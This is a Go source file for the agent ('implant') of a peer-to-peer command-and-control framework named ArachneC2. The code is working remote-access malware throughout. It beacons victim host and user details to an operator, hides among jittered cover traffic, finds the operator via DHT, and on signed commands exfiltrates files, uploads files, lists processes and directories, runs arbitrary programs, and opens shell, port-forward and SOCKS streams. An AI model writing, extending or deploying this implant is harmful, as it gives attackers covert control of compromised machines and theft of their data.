package core

import (
	"context"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"runtime/debug"
	"sync"
	"time"

	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	tcp "github.com/libp2p/go-libp2p/p2p/transport/tcp"
	ws "github.com/libp2p/go-libp2p/p2p/transport/websocket"
	"github.com/multiformats/go-multiaddr"
	"google.golang.org/protobuf/proto"

	"github.com/portbuster1337/ArachneC2/pkg/cryptography"
	"github.com/portbuster1337/ArachneC2/pkg/transport"
	apb "github.com/portbuster1337/ArachneC2/protobuf/apb"
	cpb "github.com/portbuster1337/ArachneC2/protobuf/cpb"
)

type Agent struct {
	node         *transport.Node
	messenger    *transport.Messenger
	keys         *cryptography.ImplantKey
	operatorPub  crypto.PubKey
	boxPubKey    *[32]byte
	config       AgentConfig
	ctx          context.Context
	cancel       context.CancelFunc
	connected    bool
	connectedMu  sync.Mutex
	wg           sync.WaitGroup
	beaconStream  network.Stream
	beaconMu      sync.Mutex
	beaconWriteMu sync.Mutex
}

type AgentConfig struct {
	OperatorAddr     string
	BeaconInterval   time.Duration
	BeaconJitter     time.Duration
	ReconnectBackoff time.Duration
	RelayAddrs       []string
	CoverTraffic     bool
	CoverInterval    time.Duration
	CoverJitter      time.Duration
}

func DefaultAgentConfig() AgentConfig {
	return AgentConfig{
		BeaconInterval:   10 * time.Second,
		BeaconJitter:     5 * time.Second,
		ReconnectBackoff: 5 * time.Second,
		CoverTraffic:     true,
		CoverInterval:    4 * time.Second,
		CoverJitter:      3 * time.Second,
	}
}

func loadOperatorPubKey() (crypto.PubKey, error) {
	if len(embeddedOperatorPubKey) == 0 {
		return nil, fmt.Errorf("no embedded operator public key — rebuild with build-implant tool")
	}
	return cryptography.PubKeyFromBytes(embeddedOperatorPubKey)
}

func loadOperatorBoxPubKey() *[32]byte {
	if len(embeddedOperatorBoxPubKey) != 32 {
		return nil
	}
	var key [32]byte
	copy(key[:], embeddedOperatorBoxPubKey)
	return &key
}

func loadImplantKey(operatorPub crypto.PubKey) (*cryptography.ImplantKey, error) {
	if len(embeddedImplantPrivKey) == 0 {
		return nil, fmt.Errorf("no embedded implant private key — rebuild with arachne generate")
	}
	priv, err := cryptography.LoadPrivateKey(embeddedImplantPrivKey)
	if err != nil {
		return nil, fmt.Errorf("unmarshal implant key: %w", err)
	}
	pub := priv.GetPublic()
	pid, err := peer.IDFromPublicKey(pub)
	if err != nil {
		return nil, fmt.Errorf("peer id from implant key: %w", err)
	}
	return &cryptography.ImplantKey{
		KeyPair:        cryptography.KeyPair{PrivateKey: priv, PublicKey: pub},
		PeerID:         pid,
		OperatorPubKey: operatorPub,
	}, nil
}

func NewAgent(ctx context.Context, cfg AgentConfig) (*Agent, error) {
	ctx, cancel := context.WithCancel(ctx)

	operatorPub, err := loadOperatorPubKey()
	if err != nil {
		cancel()
		return nil, fmt.Errorf("load operator pubkey: %w", err)
	}

	keys, err := loadImplantKey(operatorPub)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("load implant key: %w", err)
	}

	nodeCfg := transport.NodeConfig{
		ListenAddr:     "/ip4/0.0.0.0/tcp/0/ws",
		BootstrapPeers: transport.DefaultBootstrapAddrs(),
		EnableRelay:    true,
		EnableMDNS:     false,
		EnableDHT:      true,
		RelayAddrs:     cfg.RelayAddrs,
		PrivateKey:     keys.PrivateKey,
	}

	node, err := transport.NewNode(ctx, nodeCfg,
		libp2p.NoTransports,
		libp2p.Transport(ws.New),
		libp2p.Transport(tcp.NewTCPTransport),
	)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("create node: %w", err)
	}

	boxPub := loadOperatorBoxPubKey()

	a := &Agent{
		keys:        keys,
		operatorPub: operatorPub,
		boxPubKey:   boxPub,
		node:        node,
		config:      cfg,
		ctx:         ctx,
		cancel:      cancel,
	}

	a.messenger = transport.NewImplantMessenger(ctx, node, keys, operatorPub, a.boxPubKey)
	a.messenger.SetHandler(a.handleCommand)

	return a, nil
}

func (a *Agent) Start() error {
	log.Printf("[implant] PeerID: %s", a.node.ID().String())
	log.Printf("[implant] Operator: %s", a.messenger.BeaconTopic())

	if a.config.OperatorAddr != "" {
		m, err := multiaddr.NewMultiaddr(a.config.OperatorAddr)
		if err != nil {
			return fmt.Errorf("parse operator addr %s: %w", a.config.OperatorAddr, err)
		}
		pi, err := peer.AddrInfoFromP2pAddr(m)
		if err != nil {
			return fmt.Errorf("parse operator peer info: %w", err)
		}
		if err := a.node.ConnectToPeer(a.ctx, *pi); err != nil {
			return fmt.Errorf("connect to operator: %w", err)
		}
		log.Printf("[implant] connected to operator directly: %s", pi.ID.String())
	}

	log.Printf("[implant] starting discovery...")
	if err := a.node.StartDiscovery(); err != nil {
		return fmt.Errorf("discovery: %w", err)
	}

	log.Printf("[implant] subscribing to commands...")
	if err := a.messenger.ListenCommands(a.ctx); err != nil {
		return fmt.Errorf("listen commands: %w", err)
	}
	if err := a.messenger.ListenTask(a.ctx, a.node.ID().String()); err != nil {
		return fmt.Errorf("listen task: %w", err)
	}

	a.node.SetStreamHandler(transport.CmdProtocolID, a.handleCommandStream)

	ns := a.messenger.RendezvousString()
	if a.node.DHT != nil {
		a.wg.Add(1)
		go a.discoverOperatorLoop(ns)
	}

	a.node.SetStreamHandler(transport.ShellProtocolID, a.handleShellStream)
	a.node.SetStreamHandler(transport.PortfwdProtocolID, a.handlePortfwdStream)
	a.node.SetStreamHandler(transport.SocksProtocolID, a.handleSocksStream)

	a.wg.Add(1)
	go a.beaconLoop()

	if a.config.CoverTraffic {
		a.wg.Add(1)
		go a.coverTrafficLoop()
	}

	a.wg.Add(1)
	go a.streamKeepaliveLoop()

	return nil
}

func (a *Agent) discoverOperatorLoop(ns string) {
	defer a.wg.Done()
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[implant] panic in discoverOperatorLoop: %v", r)
		}
	}()
	log.Printf("[implant] DHT discovery started for: %s", ns)
	for {
		if a.node.DHT != nil {
			rt := a.node.DHT.RoutingTable()
			if rt != nil && rt.Size() >= 5 {
				break
			}
		}
		select {
		case <-a.ctx.Done():
			return
		case <-time.After(2 * time.Second):
		}
	}

	for {
		func() {
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[implant] panic in discoverOperatorLoop iteration: %v", r)
				}
			}()
			peerCh, err := a.node.FindPeers(a.ctx, ns)
			if err != nil {
				log.Printf("[implant] DHT find peers: %v", err)
				return
			}

			for pi := range peerCh {
				if pi.ID == a.node.ID() || pi.ID != a.messenger.OperatorID() || len(pi.Addrs) == 0 {
					continue
				}
				if err := a.node.ConnectToPeer(a.ctx, pi); err != nil {
					log.Printf("[implant] DHT connect to %s: %v", pi.ID.String(), err)
					continue
				}
				a.connectedMu.Lock()
				if !a.connected {
					a.connected = true
					a.connectedMu.Unlock()
					log.Printf("[implant] connected to operator via DHT: %s", pi.ID.String())
					go a.sendBeaconDirect(pi.ID)
				} else {
					a.beaconMu.Lock()
					streamNil := a.beaconStream == nil
					a.beaconMu.Unlock()
					a.connectedMu.Unlock()
					if streamNil {
						log.Printf("[implant] beacon stream nil, reconnecting to %s", pi.ID.String())
						go a.sendBeaconDirect(pi.ID)
					}
				}
			}

			a.connectedMu.Lock()
			cs := a.node.Host.Network().Connectedness(a.messenger.OperatorID())
			if a.connected && cs != network.Connected && cs != network.Limited {
				a.connected = false
			}
			a.connectedMu.Unlock()
		}()

		select {
		case <-a.ctx.Done():
			return
		case <-time.After(15 * time.Second):
		}
	}
}

func cryptoJitter(max time.Duration) time.Duration {
	if max <= 0 {
		return 0
	}
	var buf [8]byte
	rand.Read(buf[:])
	n := int64(binary.LittleEndian.Uint64(buf[:]) & 0x7FFFFFFFFFFFFFFF)
	return time.Duration(n % int64(max))
}

func (a *Agent) beaconLoop() {
	defer a.wg.Done()
	for {
		func() {
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[implant] panic in beaconLoop: %v\n%s", r, debug.Stack())
				}
			}()
			a.sendBeaconRegister()
		}()

		jitter := cryptoJitter(a.config.BeaconJitter)
		sleep := a.config.BeaconInterval + jitter

		select {
		case <-a.ctx.Done():
			return
		case <-time.After(sleep):
		}
	}
}

func (a *Agent) streamKeepaliveLoop() {
	defer a.wg.Done()
	for {
		select {
		case <-a.ctx.Done():
			return
		case <-time.After(5 * time.Second):
		}

		func() {
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[implant] panic in streamKeepaliveLoop: %v\n%s", r, debug.Stack())
				}
			}()

			a.connectedMu.Lock()
			connected := a.connected
			opID := a.messenger.OperatorID()
			a.connectedMu.Unlock()

			if !connected {
				return
			}

			env := a.messenger.CreateEnvelope(transport.MsgTypeCover, nil)
			if err := a.sendEnvelopeDirect(opID, env); err != nil {
				// keepalive failures expected when circuit is dead
			}
		}()
	}
}

func (a *Agent) coverTrafficLoop() {
	defer a.wg.Done()
	for {
		jitter := cryptoJitter(a.config.CoverJitter)
		sleep := a.config.CoverInterval + jitter

		select {
		case <-a.ctx.Done():
			return
		case <-time.After(sleep):
		}

		func() {
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[implant] panic in coverTrafficLoop: %v\n%s", r, debug.Stack())
				}
			}()
			a.sendCoverTraffic()
		}()
	}
}

func (a *Agent) sendCoverTraffic() {
	env := a.messenger.CreateEnvelope(transport.MsgTypeCover, nil)
	topic := a.messenger.BeaconTopic()
	if err := a.messenger.SignAndSend(a.ctx, topic, env); err != nil {
		log.Printf("[implant] cover traffic: %v", err)
	}
}

func (a *Agent) sendBeaconRegister() {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	if u, err := user.Current(); err == nil && u.Name != "" {
		username = u.Name
	} else if err == nil && u.Username != "" {
		username = u.Username
	}
	uid, gid := "", ""
	if runtime.GOOS != "windows" {
		uid = fmt.Sprintf("%d", os.Getuid())
		gid = fmt.Sprintf("%d", os.Getgid())
	}
	reg := &apb.Register{
		Name:     username,
		Hostname: hostname,
		UUID:     a.node.ID().String(),
		Username: username,
		UID:      uid,
		GID:      gid,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		PID:      int32(os.Getpid()),
		Filename: os.Args[0],
		Version:  "0.1.0",
		Locale:   os.Getenv("LANG"),
		ActiveC2: a.messenger.OperatorID().String(),
	}

	beaconReg := &apb.Z1{
		ID:       a.node.ID().String(),
		Interval: int64(a.config.BeaconInterval.Seconds()),
		Jitter:   int64(a.config.BeaconJitter.Seconds()),
		Register: reg,
	}
	beaconData, err := proto.Marshal(beaconReg)
	if err != nil {
		log.Printf("[implant] marshal beacon register: %v", err)
		return
	}

	env := a.messenger.CreateEnvelope(transport.MsgTypeRegister, beaconData)

	a.connectedMu.Lock()
	connected := a.connected
	opID := a.messenger.OperatorID()
	a.connectedMu.Unlock()

	if connected {
		if err := a.sendEnvelopeDirect(opID, env); err == nil {
			log.Printf("[implant] sent beacon register to %s", opID.String())
			return
		}
	}

	topic := a.messenger.BeaconTopic()
	if err := a.messenger.SignAndSend(a.ctx, topic, env); err != nil {
		log.Printf("[implant] send register: %v", err)
	}
}

func (a *Agent) sendBeaconDirect(operatorID peer.ID) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[implant] panic in sendBeaconDirect: %v", r)
		}
	}()
	log.Printf("[implant] sending direct beacon to %s", operatorID.String())

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	if u, err := user.Current(); err == nil && u.Name != "" {
		username = u.Name
	} else if err == nil && u.Username != "" {
		username = u.Username
	}
	uid, gid := "", ""
	if runtime.GOOS != "windows" {
		uid = fmt.Sprintf("%d", os.Getuid())
		gid = fmt.Sprintf("%d", os.Getgid())
	}
	reg := &apb.Register{
		Name:     username,
		Hostname: hostname,
		UUID:     a.node.ID().String(),
		Username: username,
		UID:      uid,
		GID:      gid,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		PID:      int32(os.Getpid()),
		Filename: os.Args[0],
		Version:  "0.1.0",
		Locale:   os.Getenv("LANG"),
		ActiveC2: a.messenger.OperatorID().String(),
	}

	beaconReg := &apb.Z1{
		ID:       a.node.ID().String(),
		Interval: int64(a.config.BeaconInterval.Seconds()),
		Jitter:   int64(a.config.BeaconJitter.Seconds()),
		Register: reg,
	}
	beaconData, err := proto.Marshal(beaconReg)
	if err != nil {
		log.Printf("[implant] direct beacon marshal: %v", err)
		return
	}
	env := a.messenger.CreateEnvelope(transport.MsgTypeRegister, beaconData)
	if err := a.sendEnvelopeDirect(operatorID, env); err != nil {
		log.Printf("[implant] direct beacon send: %v", err)
		a.connectedMu.Lock()
		a.connected = false
		a.connectedMu.Unlock()
		return
	}
	log.Printf("[implant] sent direct beacon to %s", operatorID.String())
}

func (a *Agent) handleCommand(ctx context.Context, env *apb.Envelope, senderPub crypto.PubKey) {
	if err := transport.VerifyEnvelope(env, a.operatorPub); err != nil {
		log.Printf("[implant] dropped command — %v", err)
		return
	}

	if a.messenger.IsReplay(env.ID) {
		log.Printf("[implant] dropped replay — type=%d id=%d", env.Type, env.ID)
		return
	}

	log.Printf("[implant] received command type=%d", env.Type)

	switch env.Type {
	case transport.MsgTypePs:
		a.handlePs(env)
	case transport.MsgTypePing:
		a.handlePing(env)
	case transport.MsgTypeDownload:
		a.handleDownload(env)
	case transport.MsgTypeUpload:
		a.handleUpload(env)
	case transport.MsgTypeScreenshot:
		a.handleScreenshot(env)
	case transport.MsgTypeLs:
		a.handleLs(env)
	case transport.MsgTypeCd:
		a.handleCd(env)
	case transport.MsgTypePwd:
		a.handlePwd(env)
	case transport.MsgTypeExecute:
		a.handleExecute(env)
	case transport.MsgTypeKill:
		a.handleKill(env)
	default:
		log.Printf("[implant] unknown cmd type=%d", env.Type)
	}
}

func (a *Agent) handleCommandStream(s network.Stream) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[implant] panic in handleCommandStream: %v\n%s", r, debug.Stack())
		}
	}()
	defer s.Close()

	remotePeer := s.Conn().RemotePeer()
	log.Printf("[implant] command stream from %s", remotePeer.String())

	var msgLen uint32
	if err := binary.Read(s, binary.LittleEndian, &msgLen); err != nil {
		log.Printf("[implant] command stream read len: %v", err)
		return
	}
	if msgLen > 1<<20 {
		return
	}
	data := make([]byte, msgLen)
	if _, err := io.ReadFull(s, data); err != nil {
		log.Printf("[implant] command stream read data: %v", err)
		return
	}

	env := &apb.Envelope{}
	if err := proto.Unmarshal(data, env); err != nil {
		log.Printf("[implant] command stream unmarshal: %v", err)
		return
	}

	a.handleCommand(a.ctx, env, nil)
}

func (a *Agent) openBeaconStream(operatorID peer.ID) (network.Stream, error) {
	ctx, cancel := context.WithTimeout(a.ctx, 15*time.Second)
	defer cancel()
	ctx = network.WithAllowLimitedConn(ctx, "beacon stream")

	s, err := a.node.NewStream(ctx, operatorID, transport.BeaconProtocolID)
	if err != nil {
		return nil, fmt.Errorf("open stream: %w", err)
	}
	return s, nil
}

func (a *Agent) sendEnvelopeDirect(operatorID peer.ID, env *apb.Envelope) error {
	var data []byte
	if a.boxPubKey != nil && len(env.Data) > 0 {
		encrypted, err := cryptography.EncryptMessage(env.Data, a.boxPubKey)
		if err != nil {
			return fmt.Errorf("encrypt: %w", err)
		}
		data = encrypted
	} else {
		data = env.Data
	}

	wireEnv := &apb.Envelope{
		ID:   env.ID,
		Type: env.Type,
		Data: data,
	}
	signingData, err := transport.EnvelopeSigningBytes(wireEnv)
	if err != nil {
		return fmt.Errorf("marshal signing data: %w", err)
	}
	sig, err := a.keys.PrivateKey.Sign(signingData)
	if err != nil {
		return fmt.Errorf("sign: %w", err)
	}
	wireEnv.Signature = sig
	pubBytes, err := crypto.MarshalPublicKey(a.keys.PrivateKey.GetPublic())
	if err == nil {
		wireEnv.SenderKey = pubBytes
	}

	s := a.getBeaconStream(operatorID)
	if s == nil {
		return fmt.Errorf("nil beacon stream")
	}

	envData, err := proto.Marshal(wireEnv)
	if err != nil {
		return fmt.Errorf("marshal: %w", err)
	}

	a.beaconWriteMu.Lock()
	defer a.beaconWriteMu.Unlock()

	s.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if err := binary.Write(s, binary.LittleEndian, uint32(len(envData))); err != nil {
		s.Close()
		a.setBeaconStream(nil)
		return fmt.Errorf("write len: %w", err)
	}
	if _, err := s.Write(envData); err != nil {
		s.Close()
		a.setBeaconStream(nil)
		return fmt.Errorf("write data: %w", err)
	}
	s.SetWriteDeadline(time.Time{})
	return nil
}

func (a *Agent) getBeaconStream(operatorID peer.ID) network.Stream {
	a.beaconMu.Lock()
	s := a.beaconStream
	if s != nil {
		a.beaconMu.Unlock()
		return s
	}
	a.beaconMu.Unlock()

	cs := a.node.Host.Network().Connectedness(operatorID)
	if cs != network.Connected && cs != network.Limited {
		connCtx, cancel := context.WithTimeout(a.ctx, 5*time.Second)
		err := a.node.ConnectToPeer(connCtx, peer.AddrInfo{ID: operatorID})
		cancel()
		if err != nil {
			return nil
		}
	}

	s, err := a.openBeaconStream(operatorID)
	if err != nil {
		return nil
	}

	a.beaconMu.Lock()
	if a.beaconStream == nil {
		a.beaconStream = s
	} else {
		s.Close()
		s = a.beaconStream
	}
	a.beaconMu.Unlock()

	log.Printf("[implant] persistent beacon stream opened")
	return s
}

func (a *Agent) setBeaconStream(s network.Stream) {
	a.beaconMu.Lock()
	a.beaconStream = s
	a.beaconMu.Unlock()
}

func (a *Agent) sendError(msgType uint32, errMsg string) {
	errResp := &cpb.Response{Err: 1, ErrMsg: errMsg}
	errData, _ := proto.Marshal(errResp)
	a.sendResult(msgType, errData)
}

func (a *Agent) sendResult(resultType uint32, data []byte) {
	env := a.messenger.CreateEnvelope(resultType, data)

	a.connectedMu.Lock()
	connected := a.connected
	opID := a.messenger.OperatorID()
	a.connectedMu.Unlock()

	if connected {
		if err := a.sendEnvelopeDirect(opID, env); err != nil {
			log.Printf("[implant] direct result failed, fallback pubsub: %v", err)
		} else {
			return
		}
	}

	topic := a.messenger.BeaconTopic()
	if err := a.messenger.SignAndSend(a.ctx, topic, env); err != nil {
		log.Printf("[implant] send result: %v", err)
	}
}

func (a *Agent) handlePs(env *apb.Envelope) {
	result := &apb.Z13{}
	result.Processes = listProcesses()
	data, _ := proto.Marshal(result)
	log.Printf("[implant] ps result: %d processes", len(result.Processes))
	a.sendResult(transport.MsgTypePs, data)
}

func (a *Agent) handlePing(env *apb.Envelope) {
	log.Printf("[implant] ping received")
	a.sendResult(transport.MsgTypePing, nil)
}

func (a *Agent) handleDownload(env *apb.Envelope) {
	req := &apb.Z22{}
	if err := proto.Unmarshal(env.Data, req); err != nil {
		a.sendError(transport.MsgTypeDownload, fmt.Sprintf("unmarshal: %v", err))
		return
	}

	result := &apb.Z23{Path: req.Path}
	fi, err := os.Stat(req.Path)
	if err != nil {
		result.Exists = false
		respData, _ := proto.Marshal(result)
		a.sendResult(transport.MsgTypeDownload, respData)
		return
	}
	const maxDownloadSize = 100 << 20 // 100MB
	if fi.Size() > maxDownloadSize {
		result.Exists = true
		result.Response = &cpb.Response{Err: 1, ErrMsg: "file too large"}
		respData, _ := proto.Marshal(result)
		log.Printf("[implant] download %s: too large (%d bytes)", req.Path, fi.Size())
		a.sendResult(transport.MsgTypeDownload, respData)
		return
	}
	data, err := os.ReadFile(req.Path)
	if err != nil {
		result.Exists = false
	} else {
		result.Exists = true
		result.Data = data
	}

	respData, _ := proto.Marshal(result)
	log.Printf("[implant] download %s: %d bytes", req.Path, len(data))
	a.sendResult(transport.MsgTypeDownload, respData)
}

func (a *Agent) handleUpload(env *apb.Envelope) {
	req := &apb.Z24{}
	if err := proto.Unmarshal(env.Data, req); err != nil {
		a.sendError(transport.MsgTypeUpload, fmt.Sprintf("unmarshal: %v", err))
		return
	}

	const maxUploadSize = 100 << 20
	if len(req.Data) > maxUploadSize {
		log.Printf("[implant] upload %s: too large (%d bytes)", req.Path, len(req.Data))
		result := &apb.Z25{
			Path:     req.Path,
			Response: &cpb.Response{Err: 1, ErrMsg: "file too large"},
		}
		respData, _ := proto.Marshal(result)
		a.sendResult(transport.MsgTypeUpload, respData)
		return
	}

	result := &apb.Z25{Path: req.Path}
	perm := os.FileMode(0644)
	if req.Overwrite {
		if err := os.WriteFile(req.Path, req.Data, perm); err != nil {
			result.Response = &cpb.Response{Err: 1, ErrMsg: err.Error()}
		} else {
			result.BytesWritten = int32(len(req.Data))
		}
	} else {
		if _, err := os.Stat(req.Path); err == nil {
			result.Response = &cpb.Response{Err: 1, ErrMsg: "file already exists"}
		} else if err := os.WriteFile(req.Path, req.Data, perm); err != nil {
			result.Response = &cpb.Response{Err: 1, ErrMsg: err.Error()}
		} else {
			result.BytesWritten = int32(len(req.Data))
		}
	}

	respData, _ := proto.Marshal(result)
	log.Printf("[implant] upload %s: %d bytes", req.Path, len(req.Data))
	a.sendResult(transport.MsgTypeUpload, respData)
}

func (a *Agent) handleScreenshot(env *apb.Envelope) {
	log.Printf("[implant] screenshot requested (not implemented on this platform)")
	result := &apb.Z3{
		Response: &cpb.Response{Err: 1, ErrMsg: "screenshot not implemented on this platform"},
	}
	data, _ := proto.Marshal(result)
	a.sendResult(transport.MsgTypeScreenshot, data)
}

func (a *Agent) handleCd(env *apb.Envelope) {
	req := &apb.Z19{}
	if err := proto.Unmarshal(env.Data, req); err != nil {
		a.sendError(transport.MsgTypeCd, fmt.Sprintf("unmarshal: %v", err))
		return
	}

	result := &apb.Z21{}
	if err := os.Chdir(req.Path); err != nil {
		result.Path = req.Path
		result.Response = &cpb.Response{Err: 1, ErrMsg: err.Error()}
	} else {
		result.Path, _ = os.Getwd()
	}

	data, _ := proto.Marshal(result)
	log.Printf("[implant] cd %s -> %s", req.Path, result.Path)
	a.sendResult(transport.MsgTypeCd, data)
}

func (a *Agent) handlePwd(env *apb.Envelope) {
	result := &apb.Z21{}
	result.Path, _ = os.Getwd()

	data, _ := proto.Marshal(result)
	log.Printf("[implant] pwd: %s", result.Path)
	a.sendResult(transport.MsgTypePwd, data)
}

func (a *Agent) handleKill(env *apb.Envelope) {
	log.Printf("[implant] kill received, shutting down")
	buf := make([]byte, 4096)
	n := runtime.Stack(buf, false)
	log.Printf("[implant] kill stack:\n%s", string(buf[:n]))
	df, _ := os.Create("implant_debug.txt")
	if df != nil {
		fmt.Fprintf(df, "KILLED\n")
		fmt.Fprintf(df, "%s\n", string(buf[:n]))
		df.Close()
	}
	a.sendResult(transport.MsgTypeKill, nil)
	time.Sleep(100 * time.Millisecond)
	os.Exit(0)
}

func (a *Agent) handleLs(env *apb.Envelope) {
	req := &apb.Z16{}
	if err := proto.Unmarshal(env.Data, req); err != nil {
		a.sendError(transport.MsgTypeLs, fmt.Sprintf("unmarshal: %v", err))
		return
	}

	result := &apb.Z17{Path: req.Path}
	fi, err := os.Stat(req.Path)
	if err != nil {
		result.Exists = false
	} else {
		result.Exists = true
		if fi.IsDir() {
			entries, err := os.ReadDir(req.Path)
			if err != nil {
				result.Exists = false
			} else {
				for _, e := range entries {
					info, _ := e.Info()
					entry := &apb.Z18{
						Name:  e.Name(),
						IsDir: e.IsDir(),
					}
					if e.Type()&os.ModeSymlink != 0 {
						link, _ := os.Readlink(filepath.Join(req.Path, e.Name()))
						entry.Link = link
					}
					if info != nil {
						entry.Size = info.Size()
						entry.ModTime = info.ModTime().Unix()
						entry.Mode = info.Mode().String()
					}
					result.Files = append(result.Files, entry)
				}
			}
		} else {
			entry := &apb.Z18{
				Name:    fi.Name(),
				IsDir:   false,
				Size:    fi.Size(),
				ModTime: fi.ModTime().Unix(),
				Mode:    fi.Mode().String(),
			}
			if fi.Mode()&os.ModeSymlink != 0 {
				link, _ := os.Readlink(req.Path)
				entry.Link = link
			}
			result.Files = append(result.Files, entry)
		}
	}

	data, _ := proto.Marshal(result)
	log.Printf("[implant] ls %s: %d entries", req.Path, len(result.Files))
	a.sendResult(transport.MsgTypeLs, data)
}

func (a *Agent) handleExecute(env *apb.Envelope) {
	req := &apb.Z14{}
	if err := proto.Unmarshal(env.Data, req); err != nil {
		a.sendError(transport.MsgTypeExecute, fmt.Sprintf("unmarshal: %v", err))
		return
	}

	result := &apb.Z15{}
	if req.Output {
		cmd := exec.CommandContext(a.ctx, req.Path, req.Args...)
		out, err := cmd.CombinedOutput()
		if err != nil {
			var exitErr *exec.ExitError
			if errors.As(err, &exitErr) {
				result.Status = uint32(exitErr.ExitCode())
			} else {
				result.Status = 1
			}
			result.Stderr = []byte(err.Error())
		}
		result.Stdout = out
	} else {
		cmd := exec.Command(req.Path, req.Args...)
		cmd.Stdout = io.Discard
		cmd.Stderr = io.Discard
		if err := cmd.Start(); err != nil {
			var exitErr *exec.ExitError
			if errors.As(err, &exitErr) {
				result.Status = uint32(exitErr.ExitCode())
			} else {
				result.Status = 1
			}
			result.Stderr = []byte(err.Error())
		} else {
			result.Pid = uint32(cmd.Process.Pid)
			go cmd.Wait()
		}
	}

	data, _ := proto.Marshal(result)
	log.Printf("[implant] execute %s: exit=%d stdout=%d", req.Path, result.Status, len(result.Stdout))
	a.sendResult(transport.MsgTypeExecute, data)
}

func (a *Agent) Close() error {
	a.cancel()
	a.wg.Wait()
	return a.node.Close()
}
